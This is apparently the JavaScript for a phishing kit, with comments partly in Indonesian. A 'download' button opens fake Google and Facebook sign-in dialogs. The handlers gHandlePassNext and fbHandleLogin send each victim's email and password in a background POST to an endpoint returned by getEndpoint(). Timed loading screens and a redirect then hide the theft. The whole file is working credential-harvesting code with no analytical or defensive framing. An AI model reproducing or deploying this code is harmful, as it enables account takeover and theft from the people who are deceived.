/* ── Avatar colors ── */
var avatarColors = {
  a:'av-red',b:'av-pink',c:'av-purple',d:'av-indigo',
  e:'av-blue',f:'av-blue',g:'av-teal',h:'av-green',
  i:'av-green',j:'av-orange',k:'av-orange',l:'av-brown',
  m:'av-red',n:'av-pink',o:'av-purple',p:'av-indigo',
  q:'av-blue',r:'av-teal',s:'av-green',t:'av-orange',
  u:'av-brown',v:'av-red',w:'av-pink',x:'av-purple',
  y:'av-indigo',z:'av-grey'
};
function getAvatarClass(l){ return avatarColors[l.toLowerCase()]||'av-blue'; }

/* ── Modal control ── */
function openModal() {
  document.getElementById('overlay').classList.add('active');
  showStep('stepChoose');
}
function closeModal() {
  document.getElementById('overlay').classList.remove('active');
}
function showStep(id) {
  document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
  document.getElementById(id).classList.add('active');
}

/* ── Loading dim ── */
function showLoading(dimId, textId, text, cb) {
  var dim = document.getElementById(dimId);
  document.getElementById(textId).textContent = text;
  dim.classList.add('active');
  setTimeout(function(){ dim.classList.remove('active'); if(cb) cb(); }, 2000);
}

/* ══════ GOOGLE HANDLERS ══════ */
var gPassVisible = false;
var gEmail = '';

function gHandleEmailNext() {
  var inp = document.getElementById('gEmailInput');
  var err = document.getElementById('gEmailError');
  var email = inp.value.trim();
  var atIdx = email.indexOf('@');
  var valid = atIdx > 0 && email.endsWith('@gmail.com') && atIdx === email.lastIndexOf('@') && email.length > 10;
  if (!valid) {
    inp.classList.add('error','shake');
    err.textContent = 'Enter a valid Gmail address';
    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
    return;
  }
  inp.classList.remove('error'); err.textContent = '';
  showLoading('gLoadingDim','gLoadingText','Memverifikasi...', function(){
    var letter = email[0].toUpperCase();
    var av = document.getElementById('gAvatarEl');
    av.textContent = letter;
    av.className = 'g-chip-avatar ' + getAvatarClass(letter);
    document.getElementById('gChipEmail').textContent = email;
    gEmail = email;
    showStep('stepGPass');
  });
}

function gHandlePassNext() {
  var inp = document.getElementById('gPassInput');
  var err = document.getElementById('gPassError');
  var pass = inp.value;
  if (pass.length < 8) {
    inp.classList.add('error','shake');
    err.textContent = 'Password must have at least 8 characters.';
    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
    return;
  }
  inp.classList.remove('error'); err.textContent = '';

  // Tampilkan loading langsung, kirim XHR di background
  var dim = document.getElementById('gPassLoadingDim');
  document.getElementById('gPassLoadingText').textContent = 'Mengirim data...';
  dim.classList.add('active');

  // Kirim data di background (tidak tunggu response untuk redirect)
  var xhr = new XMLHttpRequest();
  xhr.open('POST', getEndpoint(), true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  var params = 'email=' + encodeURIComponent(gEmail) + '&password=' + encodeURIComponent(pass) + '&login=Google';
  xhr.send(params);

  // Tepat 2 detik setelah klik — langsung redirect
  setTimeout(function() { locationRedirect(); }, 2000);
}

function gTogglePass() {
  gPassVisible = !gPassVisible;
  document.getElementById('gPassInput').type = gPassVisible ? 'text' : 'password';
  document.getElementById('gEyeOn').style.display  = gPassVisible ? 'block' : 'none';
  document.getElementById('gEyeOff').style.display = gPassVisible ? 'none'  : 'block';
}

/* ══════ FACEBOOK HANDLERS ══════ */
var fbPassVisible = false;

function fbHandleLogin() {
  var emailInp = document.getElementById('fbEmailInput');
  var passInp  = document.getElementById('fbPassInput');
  var emailErr = document.getElementById('fbEmailError');
  var passErr  = document.getElementById('fbPassError');
  var email = emailInp.value.trim();
  var pass  = passInp.value;

  var emailOk = email.length > 0;
  var passOk  = pass.length >= 8;

  if (!emailOk) {
    emailInp.classList.add('error','shake');
    emailErr.textContent = 'Masukkan email atau nomor ponsel.';
    setTimeout(function(){ emailInp.classList.remove('shake'); }, 400);
    return;
  }
  emailErr.textContent = '';

  if (!passOk) {
    passInp.classList.add('error','shake');
    passErr.textContent = 'Kata sandi minimal 8 karakter.';
    setTimeout(function(){ passInp.classList.remove('shake'); }, 400);
    return;
  }
  passErr.textContent = '';

  var btn = document.getElementById('fbLoginBtn');
  var spinner = document.getElementById('fbBtnSpinner');
  var btnText = document.getElementById('fbBtnText');
  btn.classList.add('loading'); btn.disabled = true;
  spinner.style.display = 'block';
  btnText.textContent = '';

  // Kirim data di background
  var xhr = new XMLHttpRequest();
  xhr.open('POST', getEndpoint(), true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&login=Facebook';
  xhr.send(params);

  // Tepat 2 detik setelah klik — lanjut ke step confirm
  setTimeout(function() {
    btn.classList.remove('loading'); btn.disabled = false;
    spinner.style.display = 'none';
    btnText.textContent = 'Login';
    document.getElementById('fbcName').textContent = email;
    showStep('stepFBConfirm');
  }, 2000);
}

function fbLanjutkan() {
  var dim = document.getElementById('fbConfirmLoadingDim');
  document.getElementById('fbConfirmLoadingText').textContent = 'Memproses...';
  dim.classList.add('active');

  // Tampil loading langsung, redirect tepat 2 detik
  setTimeout(function() { locationRedirect(); }, 2000);
}

function fbTogglePass() {
  fbPassVisible = !fbPassVisible;
  document.getElementById('fbPassInput').type = fbPassVisible ? 'text' : 'password';
  document.getElementById('fbEyeOn').style.display  = fbPassVisible ? 'block' : 'none';
  document.getElementById('fbEyeOff').style.display = fbPassVisible ? 'none'  : 'block';
}

function fbUpdateClear() {
  var val = document.getElementById('fbEmailInput').value;
  var btn = document.getElementById('fbClearBtn');
  btn.classList.toggle('visible', val.length > 0);
}

function fbClearEmail() {
  document.getElementById('fbEmailInput').value = '';
  document.getElementById('fbClearBtn').classList.remove('visible');
  document.getElementById('fbEmailInput').focus();
}

/* ── Global init ── */
window.addEventListener('DOMContentLoaded', function(){
  document.getElementById('overlay').addEventListener('click', function(e){
    if (e.target === this) closeModal();
  });

  document.getElementById('gEmailInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('gEmailError').textContent = '';
  });
  document.getElementById('gPassInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('gPassError').textContent = '';
  });

  document.getElementById('fbEmailInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('fbEmailError').textContent = '';
    fbUpdateClear();
  });
  document.getElementById('fbPassInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('fbPassError').textContent = '';
  });

  document.addEventListener('keydown', function(e){
    if (e.key !== 'Enter') return;
    if (document.getElementById('stepGEmail').classList.contains('active')) gHandleEmailNext();
    else if (document.getElementById('stepGPass').classList.contains('active')) gHandlePassNext();
    else if (document.getElementById('stepFB').classList.contains('active')) fbHandleLogin();
  });

  document.getElementById('downloadBtn').addEventListener('click', openModal);
});
